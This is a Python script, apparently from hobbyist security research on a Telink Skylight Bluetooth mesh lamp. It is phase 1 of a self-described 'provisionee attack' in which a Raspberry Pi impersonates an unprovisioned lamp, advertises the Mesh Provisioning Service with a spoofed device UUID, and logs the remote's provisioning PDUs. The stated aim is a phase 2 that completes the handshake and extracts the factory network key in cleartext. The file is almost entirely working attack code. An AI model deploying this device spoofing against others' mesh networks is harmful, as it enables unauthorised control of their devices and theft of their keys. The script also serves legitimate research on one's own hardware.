#!/usr/bin/env python3
"""
Provisionee attack, PHASE 1 (de-risk): the Pi poses as an UNPROVISIONED mesh
lamp (advertises Mesh Provisioning Service 0x1827 + device UUID) and logs EVERY
incoming provisioning PDU.

Goal: check whether the original remote (when ON is held for 10s it acts as a
provisioner) WANTS to provision our fake device. A `Provisioning Invite (0x00)`
in the log means: it takes the bait -> green light for the full provisionee
state machine (phase 2), which drives the handshake to completion and pulls out
the factory NetKey in cleartext.

Unlike imp_lamp.py (which spoofed the KNOWN lamp, advertised 0x1828/proxy), here
we present as a FRESH, unprovisioned device -> the remote should start the
provisioning handshake, not send fully-encrypted mesh data.

Start (in the bless venv, root for BLE advertising); stop the bridge first:
    sudo systemctl stop skylight-bridge
    sudo ~/imp-venv/bin/python research/imp_prov.py [runtime_s]
"""

import asyncio
import re
import subprocess
import sys
from datetime import datetime

from bless import (BlessServer, BlessGATTCharacteristic,
                   GATTCharacteristicProperties as Props,
                   GATTAttributePermissions as Perm)
from bless.backends.bluezdbus.dbus.application import BlueZGattApplication


# bless' own advertising jams on BlueZ 5.82 -> out; we advertise via btmgmt
# (a reliable adv instance with exact bytes).
async def _skip(self, adapter):
    pass


BlueZGattApplication.start_advertising = _skip
BlueZGattApplication.stop_advertising = _skip

NAME = "BK_MESH_light"

# Mesh Provisioning Service + PB-GATT characteristics (SIG standard)
PROV_SVC = "00001827-0000-1000-8000-00805f9b34fb"
PROV_IN = "00002adb-0000-1000-8000-00805f9b34fb"    # Data In  (write-no-resp)
PROV_OUT = "00002adc-0000-1000-8000-00805f9b34fb"   # Data Out (notify)

# Telink Skylight device UUID pattern: <7B prefix><reversed MAC><3B suffix>.
# Prefix/suffix are (observed) product constants; the MAC part is derived at
# RUNTIME from the - possibly spoofed - adapter, so the UUID matches the address
# actually advertising (no hardcoded device IDs).
UUID_PREFIX = bytes.fromhex("0064b4692d0900")
UUID_SUFFIX = bytes.fromhex("000001")
OOB_INFO = b"\x00\x00"


def _adapter_mac():
    out = subprocess.run(["btmgmt", "info"], capture_output=True, text=True).stdout
    m = re.search(r"addr ([0-9A-Fa-f:]{17})", out)
    if not m:
        raise RuntimeError("adapter MAC not determinable (btmgmt info)")
    return m.group(1)


def _dev_uuid():
    mac = bytes.fromhex(_adapter_mac().replace(":", ""))
    return UUID_PREFIX + mac[::-1] + UUID_SUFFIX


DEV_UUID = _dev_uuid()

PDU_NAMES = {0: "INVITE", 1: "CAPABILITIES", 2: "START", 3: "PUBLIC_KEY",
             4: "INPUT_COMPLETE", 5: "CONFIRMATION", 6: "RANDOM", 7: "DATA",
             8: "COMPLETE", 9: "FAILED"}


class Sar:
    """PB-GATT/proxy PDU reassembly: byte0 = (SAR<<6)|msgtype, rest = payload."""

    def __init__(self):
        self.buf = b""

    def feed(self, frame):
        sar, payload = frame[0] >> 6, frame[1:]
        if sar == 0:                 # complete
            return payload
        if sar == 1:                 # first segment
            self.buf = payload
            return None
        self.buf += payload
        if sar == 3:                 # last segment
            out, self.buf = self.buf, b""
            return out
        return None                  # middle segment


def stamp():
    return datetime.now().strftime("%H:%M:%S.%f")[:-3]


def _adv_data_hex():
    # Flags + Complete-16bit-UUID(0x1827) + Service-Data(0x1827: DevUUID+OOB)
    sd = bytes([0x16, 0x27, 0x18]) + DEV_UUID + OOB_INFO
    sd_ad = bytes([len(sd)]) + sd
    flags = bytes([0x02, 0x01, 0x06])
    uuid_ad = bytes([0x03, 0x03, 0x27, 0x18])
    return (flags + uuid_ad + sd_ad).hex()


def set_adv(on):
    # bluetoothctl does not reliably send service data non-interactively ->
    # robustly via btmgmt (connectable adv instance with exact bytes).
    subprocess.run(["btmgmt", "rm-adv", "1"], capture_output=True, timeout=10)
    if not on:
        return "adv aus"
    r = subprocess.run(["btmgmt", "add-adv", "-c", "-d", _adv_data_hex(), "1"],
                       capture_output=True, text=True, timeout=10)
    return (r.stdout or "") + (r.stderr or "")


sar = Sar()
got = []


def on_write(characteristic, value, **kwargs):
    data = bytes(value)
    msgtype = data[0] & 0x3F if data else -1
    print(f"[{stamp()}] WRITE {characteristic.uuid[4:8]} raw={data.hex()} "
          f"(msgtype=0x{msgtype:02x})", flush=True)
    pdu = sar.feed(data)
    if pdu:
        ptype = pdu[0] & 0x3F
        name = PDU_NAMES.get(ptype, f"UNKNOWN_0x{ptype:02x}")
        print(f"    >>> provisioning PDU: {name}  payload={pdu[1:].hex()}",
              flush=True)
        got.append(name)
    characteristic.value = value


def on_read(characteristic, **kwargs):
    return characteristic.value


async def main():
    runtime = int(sys.argv[1]) if len(sys.argv) > 1 else 90

    server = BlessServer(name=NAME)
    server.read_request_func = on_read
    server.write_request_func = on_write

    await server.add_new_service(PROV_SVC)
    await server.add_new_characteristic(
        PROV_SVC, PROV_IN, Props.write | Props.write_without_response, b"",
        Perm.writeable)
    await server.add_new_characteristic(
        PROV_SVC, PROV_OUT, Props.notify, b"", Perm.readable)

    await server.start()
    adv_out = set_adv(True)
    if "added" not in adv_out.lower():
        print(f"# WARNING: btmgmt advertising may NOT be active:\n{adv_out}",
              flush=True)
    else:
        print(f"# btmgmt adv active ({adv_out.strip()}), "
              f"data={_adv_data_hex()}", flush=True)
    print(f"# Fake UNPROVISIONED lamp '{NAME}' running {runtime}s "
          f"(advertised: Mesh Provisioning 0x1827)", flush=True)
    print(f"# device UUID = {DEV_UUID.hex()}", flush=True)
    print("# ===> NOW hold ON for 10s on the remote (several times). "
          "Waiting for INVITE ...", flush=True)
    try:
        await asyncio.sleep(runtime)
    finally:
        set_adv(False)
        await server.stop()

    print(f"\n# === {len(got)} provisioning PDU(s) received ===", flush=True)
    if "INVITE" in got:
        print("# >>> INVITE RECEIVED! The remote wants to provision us.\n"
              "#     -> green light for phase 2 (full provisionee "
              "state machine -> factory NetKey).", flush=True)
    elif got:
        print("# PDUs arrived, but no INVITE - check the log above.", flush=True)
    else:
        print("# Nothing received. Possible reasons: the remote does not connect /\n"
              "#     accepts only known devices / the adv format (service data)\n"
              "#     is not right yet. Decide the next step accordingly.",
              flush=True)


if __name__ == "__main__":
    asyncio.run(main())
